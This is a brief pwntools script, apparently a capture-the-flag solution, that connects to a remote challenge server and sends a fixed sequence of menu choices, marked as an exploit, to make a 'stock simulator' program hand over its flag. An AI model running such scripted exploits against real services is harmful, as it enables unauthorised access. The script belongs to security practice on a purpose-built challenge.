import pwn

def invest():
  io.sendline(b"2")

def eat():
  io.sendline(b"1")

def flag():
  io.sendline(b"3")

io = pwn.remote("challenges.sshuzl.de", 12375)
# io = pwn.process("./stock_simulator")

### Exploit

invest()
eat()

for _ in range(15):
  invest()

flag()

io.interactive()
